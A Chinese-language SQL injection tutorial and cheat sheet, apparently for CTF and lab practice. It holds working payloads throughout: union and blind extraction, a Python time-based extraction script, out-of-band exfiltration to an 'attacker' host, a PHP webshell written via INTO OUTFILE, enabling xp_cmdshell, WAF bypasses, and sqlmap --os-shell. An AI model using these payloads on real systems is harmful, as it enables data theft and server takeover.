---
title: "SQL 注入：从原理到实战"
summary: "一条从确认注入到取数、读文件、命令执行的阶梯：先判断回显模型，再选联合/报错/盲注/堆叠；每一步都给前提、成功标志、失败分支与 DBMS 差异。"
module: Web
topic: Web漏洞
tags: []
status: 已整理
sourceIds: []
challengeIds: []
relatedIds: ["web-nosql", "web-waf-bypass", "web-php-audit", "web-http-smuggling", "web-local-lab", "web-source-route"]
updated: "2026-10-29"
---

> 适用：本地靶场、CTF 或明确授权的系统。`INTO OUTFILE`、`LOAD_FILE`、`xp_cmdshell` 会读文件或执行命令，先在快照环境验证。

## 00 全图：注入到底改了什么

### 30 秒速查

| 我要… | 先试… | 备注 |
|---|---|---|
| 确认字符型 | `id=1'` / `id=1''` | 报错或页面变化 |
| 确认布尔 | `and 1=1` / `and 1=2` | 两次结果必须不同 |
| 定列数 | `order by n` | 二分到报错边界 |
| 找回显位 | `union select 1,2,3` | 用 `-1` 让前半句为空 |
| 看库/用户 | `database(),user(),version()` | 先确认 DBMS |
| 列表/列 | `information_schema.tables/columns` | 表名可用十六进制 |
| 无回显 | `ascii(substr((...),1,1))>n` | 二分法 |
| 时间盲 | `sleep(3)` / `pg_sleep(3)` / `waitfor delay` | 先测基线 |
| 写文件 | `... into outfile '/path/s.php'` | 先查 `secure_file_priv` |
| 命令 | `xp_cmdshell` / `copy program` | 先查权限 |
| 自动化 | `sqlmap -u "..." --batch --dbs` | 手工确认后再用 |

```text
输入 → 拼接 SQL → 数据库解析 → 执行 → 结果 / 错误 / 时间 / 外带
              ↑
        可控点在这里
```

注入成立的三个条件，缺一不可：

| 条件 | 含义 | 不满足时 |
|---|---|---|
| 进入 SQL | 参数被拼进查询，而不是只做展示 | 不是 SQLi |
| 未被参数化 | 没有预处理/白名单，数据被当语法 | 找二次注入/其他洞 |
| 查询被执行 | 有执行权限、连接正常 | 换注入点或换目标 |

根因是**数据与代码走同一条通道**。预处理语句先编译 SQL 结构、再绑定数据，所以数据永远变不成关键字。

但“用了参数化”不等于全盖住：

| 场景 | 能否覆盖 | 说明 |
|---|---|---|
| 数字/字符串值 | 能 | 占位符只绑定值 |
| LIKE 的 `%` / `_` | 不能完全 | 通配符仍会扩大匹配，需转义 |
| 表名/列名/`ASC`/`DESC` | 不能 | 标识符只能白名单映射 |
| 存储过程内部动态 SQL | 不能 | 过程里再拼接仍会注入 |
| 客户端“假参数化” | 不能 | 看驱动真正执行的那条语句 |

### 注入点上下文

闭合符由上下文决定，不是背 `' or 1=1-- -`：

| 上下文 | 示例 | 常用闭合 |
|---|---|---|
| 数字 | `id = $id` | `1 and 1=1`、`1)` |
| 字符串 | `name = '$name'` | `' and '1'='1`、`')` |
| LIKE / 搜索型 | `like '%$q%'` | `%' and 1=1-- -` |
| IN | `id in ($ids)` | `1) and 1=1-- -` |
| ORDER BY | `order by $col` | `id,(select...)`、`if(...)` |
| LIMIT | `limit $n` | `1,1 into outfile ...` |
| 标识符 | `select $col from` | 反引号/括号/白名单绕过 |
| JSON/XML | `{"id":"$id"}` | 先闭合 JSON 字符串 |

## 01 L0 确认：一次只改一个变量

先建立基线，再做“只改一个字符”的差分。不要在没确认前直接上 sqlmap。

| 测试 | 请求 | 说明 |
|---|---|---|
| 基线 | `id=1` | 记录状态码、长度、关键文本、时间 |
| 引号 | `id=1'` | 报错/空白/500 → 字符串型候选 |
| 数字布尔 | `id=1 and 1=1` vs `id=1 and 1=2` | 有差异 → 数字型/布尔可用 |
| 字符布尔 | `id=1' and '1'='1` vs `id=1' and '1'='2` | 有差异 → 字符型 |
| 注释 | `id=1'-- -`、`id=1'#`、`id=1';%00` | 试出可用注释 |
| 时间 | `id=1' and sleep(3)-- -` | 无回显时的确认 |

**成功标志**：同一 payload 重复 3 次结果一致；对照组恢复基线；差异随 payload 变化，而不是随机抖动。

**假阳性排查**：

| 现象 | 可能原因 | 处理 |
|---|---|---|
| 加引号必报错 | 参数本来就要求数字/JSON | 换类型、换编码 |
| `and 1=1` 和 `1=2` 一样 | 参数未使用/WAF 直接拦 | 看响应头、换参数、换注入点 |
| 两次请求结果不同 | 缓存/随机内容/限流 | 加随机参数、等间隔重试 |
| 时间忽长忽短 | 网络抖动/服务排队 | 基线测 3 次，延迟设 5s |
| 引号变成 `&#39;` | 输出编码，不是 SQL | 不是注入 |

## 02 选模型：有回显优先，无回显再盲

```text
有数据库报错？ ──是──> 报错注入
      │否
有可见回显位？ ──是──> 联合注入
      │否
布尔差异稳定？ ──是──> 布尔盲注
      │否
时间差异稳定？ ──是──> 时间盲注
      │否
能出网？ ──────是──> OOB（DNS/HTTP）
      │否
能堆叠？ ──────是──> 堆叠/写文件/命令
```

| 模型 | 前提 | 优点 | 限制 |
|---|---|---|---|
| 联合 | 列数、类型可匹配，有回显 | 一次取多行，最快 | 列数/回显位/类型受限 |
| 报错 | 错误回显到页面 | 快，单请求 | 函数/版本/WAF 限制 |
| 布尔 | 真假页面可区分 | 通用 | 请求多，需脚本 |
| 时间 | 可执行 `sleep` 等 | 无回显也能打 | 慢、受网络影响 |
| OOB | 数据库能发起网络请求 | 绕过回显限制 | 依赖权限/出网 |
| 堆叠 | 驱动支持多语句 | 可写文件/命令 | 多数 Web 驱动关闭 |

## 03 L1 联合注入：列数 → 回显位 → 类型 → 数据

### 3.1 定列数

```sql
id=1 order by 1-- -
id=1 order by 2-- -
...
id=1 order by 10-- -   -- 报错说明列数 < 10
id=1 union select 1,2,3-- -  -- 报“列数不同”就继续加
```

二分更快：`order by 8` 正常、`order by 16` 报错，再缩到 8–16。`order by` 被拦时，用 `group by` 或直接 `union select null,...` 试。

### 3.2 找回显位

```sql
id=-1 union select 1,2,3-- -
id=-1 union select 1,concat(0x7e,version(),0x7e),3-- -
```

只回显部分列时，把每一列依次替换成 `concat(0x7e,@@version,0x7e)`，看哪一列出现在页面。原查询有结果时用 `id=-1` 让前半句为空。

### 3.3 类型匹配

| 列类型 | 可用值 |
|---|---|
| 数字 | `1`、`0` |
| 字符串 | `'a'`、`0x61`、`null` |
| 日期/其他 | `null` 最稳 |

联合查询要求列数相同、类型可隐式转换；不确定时全用 `null`，再把回显位替换成字符串。

### 3.4 取数据（MySQL 模板）

```sql
-- 库名/用户/版本/路径
id=-1 union select 1,database(),user(),version(),@@datadir-- -

-- 表名
id=-1 union select 1,group_concat(table_name),3
from information_schema.tables
where table_schema=database()-- -

-- 列名（表名用十六进制避免引号）
id=-1 union select 1,group_concat(column_name),3
from information_schema.columns
where table_name=0x7573657273-- -

-- 数据
id=-1 union select 1,group_concat(concat(username,0x3a,password)),3
from users-- -
```

`group_concat` 受 `group_concat_max_len` 限制（默认 1024 字节），超长时用 `substr` 分段，或先 `select @@group_concat_max_len`。

### 3.5 列名被过滤：无列名读取

```sql
-- 派生表给数字列“起名”
id=-1 union select 1,(select `2` from (select 1,2,3)x),3-- -

-- join 写法
select * from (select 1)a join (select 2)b join (select 3)c;
```

`procedure analyse()` 可回显列名/类型，但 MySQL 8 已移除，5.x 才可用。拿不到列名时按业务猜：`username`、`password`、`email`、`token`、`flag`。

### 3.6 失败分支

| 现象 | 原因 | 下一步 |
|---|---|---|
| `order by` 报错但 `union select 1` 正常 | 列数恰好为 1 | 直接联合 |
| 列数对了但页面无变化 | 回显位不在页面 | 换 `concat` 标记、换列 |
| 联合被 WAF 拦 | `union select` 关键字 | 大小写/内联注释/`union all` |
| 只能读一行 | 页面只取第一条 | `limit` 偏移或 `group_concat` |

### 3.7 HANDLER：绕过 SELECT 限制

MySQL 的 `HANDLER` 不走 `SELECT`，`select` 关键字被过滤时可用：

```sql
handler users open;
handler users read first;
handler users read next;
handler users close;
```

需要知道表名；只能逐行读，适合小表/flag 表。堆叠不可用时，`HANDLER` 也打不出去，回到联合/盲注。

## 04 L1 报错注入：让数据库替你回显

前提：**错误信息回显到页面**，且相关函数未被禁用。

| DBMS | 模板 | 备注 |
|---|---|---|
| MySQL | `updatexml(1,concat(0x7e,(select database()),0x7e),1)` | 5.1+，回显约 32 字符，长数据用 `substr` |
| MySQL | `extractvalue(1,concat(0x7e,(select user()),0x7e))` | 同上 |
| MySQL | `select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2))` | 5.x，表数据需足够多 |
| MySQL | `exp(~(select * from(select database())x))` | 版本相关，先本地验证 |
| SQL Server | `convert(int,(select @@version))` | 类型转换报错 |
| PostgreSQL | `cast((select current_database()) as int)` | 类型转换报错 |
| Oracle | `utl_inaddr.get_host_name((select user from dual))` | 需权限/版本支持 |

MySQL 报错常被截断，取长数据时：

```sql
id=1 and updatexml(1,concat(0x7e,substr((select group_concat(table_name)
from information_schema.tables where table_schema=database()),1,20),0x7e),1)-- -
```

失败分支：错误被 `display_errors=Off` 吞掉 → 转布尔/时间；函数被 WAF 拦 → 换 `floor`/`exp`；只能报一次 → 用 `substr` 分段。

## 05 L2 盲注：把“是/否”变成数据

### 5.1 布尔盲注

```sql
-- 判断库名第一个字符的 ASCII 是否大于 100
id=1' and ascii(substr((select database()),1,1))>100-- -
```

二分法：先测 `>64`、`>96`、`>112`，每轮把区间减半，7 次左右定位一个字符。字符集先按 `[0-9a-zA-Z{}_-]` 缩小范围，再退回全 ASCII。

### 5.2 时间盲注

| DBMS | 延迟表达式 |
|---|---|
| MySQL | `sleep(3)`、`benchmark(10000000,md5(1))` |
| SQL Server | `waitfor delay '0:0:3'` |
| PostgreSQL | `pg_sleep(3)` |
| Oracle | `dbms_pipe.receive_message(('a'),3)`、`dbms_lock.sleep(3)` |
| SQLite | 无 sleep，用大表/复杂查询拖时间 |

```sql
id=1' and if(ascii(substr((select database()),1,1))>100,sleep(3),0)-- -
```

时间盲注的误差控制：

- 基线测 3 次，取中位数；延迟设 3–5 秒，别用 1 秒。
- 同一 `Session`/连接，避免握手差异；每次请求加随机参数防缓存。
- 先确认 `sleep` 真的执行（`and sleep(0)` 与 `sleep(3)` 对比），再写脚本。
- 网络抖动大时，用“两次延迟差值”而不是绝对时间。

### 5.3 脚本骨架

```python
import requests, time
S = requests.Session()
URL = "http://target/item?id=1"

def cond(payload, delay=3.0):
    t = time.time()
    r = S.get(URL + payload, timeout=delay + 5)
    return time.time() - t >= delay, r.status_code, len(r.text)

def extract(expr, n):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        ok, _, _ = cond(f"' and if(ascii(substr(({expr}),{n},1))>{mid},sleep(3),0)-- -")
        if ok: lo = mid + 1
        else: hi = mid
    return chr(lo)

print(''.join(extract("select database()", i) for i in range(1, 20)))
```

先取长度（`length()`），再逐字符；每字符独立重试 2 次，失败就跳过并记录，避免一个字符卡死全流程。

### 5.4 外带（OOB）

| DBMS | 手法 |
|---|---|
| MySQL（Windows） | `load_file('\\\\attacker\\share\\a')`、`INTO OUTFILE '\\\\attacker\\share\\a'` |
| SQL Server | `exec master..xp_dirtree '\\attacker\share'` |
| Oracle | `utl_http.request('http://attacker/'||(select user from dual))` |
| PostgreSQL | `copy (select '') to program 'curl http://attacker/$(id)'`（超级用户） |
| SQLite | 一般无网络能力 |

OOB 适合“无回显、不能时间盲”的场景；需要目标能出网、DNS/HTTP 可控。先打一个空请求确认通道，再带数据。

## 06 L3 堆叠、文件与命令：先问权限

### 6.1 堆叠支持

| DBMS/驱动 | 多语句 |
|---|---|
| MySQL `mysqli_multi_query` / PDO 多语句 | 可能支持，默认常关 |
| SQL Server | 常见支持 |
| PostgreSQL | 常见支持 |
| Oracle | 匿名块/`BEGIN...END` |
| SQLite `executescript` | 支持 |

不能堆叠时，单条语句里用子查询/联合/报错完成，不要硬试 `; drop`。

### 6.2 权限自检

```sql
-- MySQL
select current_user(), @@secure_file_priv;
show grants;

-- SQL Server
select is_srvrolemember('sysadmin');

-- PostgreSQL
select current_setting('is_superuser');

-- Oracle
select * from session_privs;
```

**没有权限就停**：继续试文件/命令只会浪费时间，转去取数据或找二次注入。

### 6.3 文件读写

| DBMS | 读 | 写 | 条件 |
|---|---|---|---|
| MySQL | `load_file('/etc/passwd')` | `... into outfile '/var/www/html/s.php'` | `FILE` 权限、`secure_file_priv` 允许、目录可写、文件不存在 |
| SQL Server | `openrowset(bulk '/etc/passwd', single_clob)` | `bcp`/`xp_cmdshell` | `AD HOC Distributed Queries`、权限 |
| PostgreSQL | `pg_read_file('/etc/passwd')` | `copy ... to program`/`lo_export` | 超级用户 |
| Oracle | `utl_file.fgetattr`/`utl_file.get_line` | `utl_file.put_line` | 目录对象、权限 |
| SQLite | `readfile()`（CLI 扩展） | `writefile()` | 扩展可用 |

MySQL 写 Webshell 模板：

```sql
id=-1 union select 1,'<?php system($_GET[1]);?>',3 into outfile '/var/www/html/s.php'-- -
```

先确认：`select @@secure_file_priv;` 为空或包含目标目录；`select @@datadir;` 找可写路径；文件不能已存在（`outfile` 不覆盖）。

### 6.4 命令执行

| DBMS | 方式 | 前提 |
|---|---|---|
| SQL Server | `exec xp_cmdshell 'whoami'` | `sysadmin`，开启 `xp_cmdshell` |
| PostgreSQL | `copy (select '') to program 'id'` | 超级用户 |
| MySQL | UDF/`into outfile` 写 Webshell | `FILE`、插件目录可写、Web 目录 |
| Oracle | `dbms_scheduler`/Java | 高权限 |

SQL Server 开启：

```sql
exec sp_configure 'show advanced options',1; reconfigure;
exec sp_configure 'xp_cmdshell',1; reconfigure;
exec xp_cmdshell 'whoami';
```

命令执行成功后先 `id`/`whoami`，再读 flag；不要改配置/删日志。

## 07 L4 绕过：按“被拦的 token”查表

先定位**最小触发片段**：把 payload 逐段删，找到被拦的那一个词/符号，再只变形它。不要整段乱改。

| 被拦 | 替代 | 示例 |
|---|---|---|
| 空格 | `/**/`、`%09`、`%0a`、`%0c`、`%a0`、`()`、`+` | `union/**/select` |
| 逗号 | `substr(x from 1 for 1)`、`limit 1 offset 1`、`join` | `substr(database() from 1 for 1)` |
| `=` | `like`、`regexp`、`in`、`between`、`<>` | `id like 1` |
| 引号 | `0x...`、`char()`、`concat(char(...))` | `table_name=0x7573657273` |
| `select` | `/*!50000select*/`、`sel/**/ect`、大小写、`union all` | `/*!50000union*/select` |
| `union` | `union(select...)`、`/*!50000union*/` | `union(select 1,2)` |
| `information_schema` | `mysql.innodb_table_stats`、`performance_schema`、盲注 | 见下 |
| `and`/`or` | `&&`、`||`、`^`、`!` | `id=1^(...)` |
| `substr` | `mid`、`left/right`、`substring` | `mid(database(),1,1)` |
| `ascii` | `ord`、`hex`、`conv` | `ord(substr(...))` |
| 注释 | `#`、`-- -`、`/*!*/`、`;%00` | 逐个试 |
| `sleep` | `benchmark`、大表、`get_lock` | `benchmark(10000000,md5(1))` |

### 7.1 系统表替代

```sql
-- MySQL 5.7+：innodb_table_stats 里可能有表名
select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();

-- 5.7+：performance_schema 里的对象
select group_concat(object_name) from performance_schema.objects_summary_global_by_type;
```

`information_schema` 被 WAF 拦时，不一定要换表：无列名读取（3.5）和盲注仍然可用。

### 7.2 代码过滤 vs WAF

| 层 | 特征 | 绕过 |
|---|---|---|
| PHP 代码过滤 | `str_replace`/`preg_match` 只处理一次 | 双写、大小写、编码、数组 |
| WAF | 统一 403/406、拦截页 | 分块、HTTP/2、`X-Forwarded-For`、注释、慢速 |
| 数据库 | 函数禁用/权限不足 | 换函数、换模型、换权限 |

代码过滤常见缺陷：`str_replace('select','',$x)` 只替换一次（`selselectect`）、`preg_match` 没加 `s`（换行绕过）、先解码后校验（二次编码）。WAF 绕过见 [WAF 绕过](/knowledge/web-waf-bypass/)。

**宽字节**：GBK/GB2312 站点用 `addslashes` 时，`%df'` 可能变成 `%df%5c%27`，其中 `%df%5c` 被解析成一个宽字符，单引号逃逸。前提是连接字符集为 GBK 且未使用预处理；UTF-8 站点不成立。

## 08 注入点不只在 URL

| 位置 | 示例 | 注意 |
|---|---|---|
| Cookie | `Cookie: id=1' and sleep(3)-- -` | 先 base64/URL 解码 |
| UA/Referer | `User-Agent: 1' and 1=1-- -` | 日志/统计接口可能入库 |
| X-Forwarded-For | `X-Forwarded-For: 1' or 1=1-- -` | 后端取 IP 入库 |
| JSON | `{"id":"1 and 1=1"}` | 闭合 JSON 字符串，注意双引号 |
| XML | `<id>1</id>` | 先确认解析器 |
| multipart 文件名 | `filename="1' and 1=1-- -.jpg"` | 入库后二次查询 |
| ORDER BY | `?sort=id,(select ...)` | 不能参数化，需白名单 |
| LIMIT | `?limit=1,1 into outfile ...` | 数字型，常被忽略 |
| 表名/列名 | `?table=users` | 标识符注入 |
| 登录框 | `username=admin'-- -` | 万能密码；现代多用预处理 |
| 二次注入 | 注册 `admin'#`，改密时触发 | 闭合符按第二次查询写 |
| 元数据 | ID3/EXIF 标签 | `exiftool`/`id3v2` 写入 |

二次注入的关键：**输入时被转义，不等于使用时安全**。找“写入后还会被读出来拼进 SQL”的字段：用户名、昵称、邮箱、文件名、地址、备注。

**约束攻击（相邻考点）**：注册时用 `admin `（尾随空格）或超长用户名，依赖数据库“比较忽略尾随空格/截断”的特性，登录时与 `admin` 冲突。它不是注入，而是唯一索引+比较规则导致的账号混淆；测试时看注册/登录两处的规范化是否一致。

## 09 DBMS 速查

| 项 | MySQL | PostgreSQL | SQL Server | Oracle | SQLite |
|---|---|---|---|---|---|
| 版本 | `version()` | `version()` | `@@version` | `v$version` | `sqlite_version()` |
| 当前库 | `database()` | `current_database()` | `db_name()` | `ora_database_name` | `PRAGMA database_list` |
| 当前用户 | `user()` | `current_user` | `suser_sname()` | `user` | 无 |
| 拼接 | `concat()` | `||` | `+` | `||` | `||` |
| 子串 | `substr/mid` | `substring` | `substring` | `substr` | `substr` |
| 分页 | `limit` | `limit` | `top/offset fetch` | `rownum/fetch` | `limit` |
| 注释 | `-- ` `#` | `--` | `--` | `--` | `--` |
| 系统表 | `information_schema` | `pg_catalog` | `sys/information_schema` | `all_tables` | `sqlite_master` |
| 文件 | `load_file/outfile` | `pg_read_file/copy` | `openrowset` | `utl_file` | `readfile()` |
| 命令 | Webshell/UDF | `copy program` | `xp_cmdshell` | `dbms_scheduler` | 无 |
| 时间 | `sleep` | `pg_sleep` | `waitfor` | `dbms_lock.sleep` | 重查询 |

## 10 sqlmap：把手工结论变成自动化

**什么时候用**：手工已确认注入、需要重复取数/盲注；不建议在未确认、WAF 很凶、参数很多的站点上直接扫。

| 目标 | 命令 |
|---|---|
| 确认 | `sqlmap -u "http://t/?id=1" --batch --current-db` |
| 列表 | `--dbs`、`--tables -D db`、`--columns -T users -D db` |
| 取数 | `--dump -C username,password -T users -D db` |
| 指定技术 | `--technique=BEUSTQ`（B 布尔/E 报错/U 联合/S 堆叠/T 时间/Q 内联） |
| 加压 | `--level=3 --risk=2`（先 1/1，再逐级） |
| 请求文件 | `-r req.txt`、`--cookie="..."`、`--data="..."` |
| 绕过 | `--tamper=space2comment,between,randomcase` |
| 文件 | `--file-read=/etc/passwd`、`--file-write=local --file-dest=/tmp/x` |
| 命令 | `--os-shell`（需权限/可写路径） |
| 稳定 | `--delay=1`、`--random-agent`、`--proxy`、`--flush-session` |

tamper 选择：

| 场景 | tamper |
|---|---|
| 空格被拦 | `space2comment`、`space2plus` |
| `=` 被拦 | `between`、`equaltolike` |
| 关键字被拦 | `randomcase`、`chunked` |
| 引号被拦 | `charunicodeencode`、`apostrophemask` |
| WAF 综合 | `space2comment,between,randomcase`（逐步加） |

工具输出“injectable”也要手工复核：可能是 WAF 回显、缓存差异或误报。取数前先 `--current-db` 验证。

## 11 实战流程：从入口到目标

| 阶段 | 动作 | 产出 |
|---|---|---|
| 1 入口 | 找参数：搜索、登录、详情、排序、API、JSON、Cookie | 可控点清单 |
| 2 指纹 | 报错/版本/注释/拼接差异 | DBMS 与版本 |
| 3 模型 | L0/L1/L2 决策树 | 联合/报错/盲注 |
| 4 取数 | 库→表→列→目标行 | 账号/flag/配置 |
| 5 提权 | 权限自检→文件/命令 | shell/文件读写 |
| 6 横向 | 配置里的 DB/SSH/云凭证 | 下一台/对象存储 |
| 7 记录 | 请求、payload、结果、时间 | 可复现报告 |

常见场景：

| 场景 | 入口 | 验证 |
|---|---|---|
| 登录框 | `username`/`password` | `admin'-- -`、`' or 1=1-- -` |
| 搜索 | `q`/`keyword` | `%' and 1=1-- -` |
| API JSON | `{"id":1}` | `{"id":"1 and 1=1"}` |
| 排序 | `sort=id` | `sort=id,(select...)` |
| 二次 | 注册/改资料 | 写入 `admin'#` 后触发改密 |
| 文件 | `load_file`/`outfile` | 先 `@@secure_file_priv` |

拿到数据后优先找**可复用凭据**：数据库密码、SSH key、云 AK/SK、后台账号。不要整库拖取、不要改数据、不要留 Webshell。

## 12 失败分支：按现象排查

| 现象 | 优先怀疑 | 处理 |
|---|---|---|
| 加引号无反应 | 参数化/类型转换/未使用 | 换参数、换注入点、试数字型 |
| `and 1=1` 与 `1=2` 相同 | WAF 直接拦/参数被过滤 | 看响应头、换编码、换关键字 |
| `union` 报列数 | 列数不对 | `order by` 二分 |
| 列数对但无回显 | 回显位不在页面 | `concat` 标记逐列试 |
| 注释失效 | 语法/驱动 | `-- -`、`#`、`;%00` 逐个试 |
| 时间盲注无延迟 | `sleep` 禁用/被缓存 | `benchmark`、换函数、加随机参数 |
| `information_schema` 被拦 | WAF/权限 | 系统表、无列名、盲注 |
| `outfile` 失败 | `secure_file_priv`/权限/文件存在 | 查变量、换目录、换文件名 |
| sqlmap 说不可注入 | 注入点在 header/JSON/二阶 | `-r`、`--cookie`、`--data`、提高 level |
| 403/406 | WAF | 降速、编码、分块、换协议 |

相关：[NoSQL 注入](/knowledge/web-nosql/)、[WAF 绕过](/knowledge/web-waf-bypass/)、[代码审计](/knowledge/web-php-audit/)、[请求走私](/knowledge/web-http-smuggling/)。
